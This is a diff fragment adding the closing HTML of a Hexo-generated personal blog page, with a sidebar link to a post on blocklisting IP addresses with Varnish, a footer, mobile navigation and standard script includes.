+            <a href="/2020/09/01/blocklist-IP-address-with-Varnish/">blocklist IP address with Varnish</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+  
+</aside>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      &copy; 2021 n3ird4<br>
+      Propulsé par <a href="https://hexo.io/" target="_blank">Hexo</a> & <a href="https://github.com/" target="_blank">Github</a>
+    </div>
+  </div>
+</footer>
+
+    </div>
+    <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">Home</a>
+  
+    <a href="/archives" class="mobile-nav-link">Archives</a>
+  
+</nav>
+    
+
+<script src="//ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>
+
+
+  <link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
+  <script src="/fancybox/jquery.fancybox.pack.js"></script>
+
+
+<script src="/js/script.js"></script>
+
+
+
+
+  </div>
+</body>
+</html>
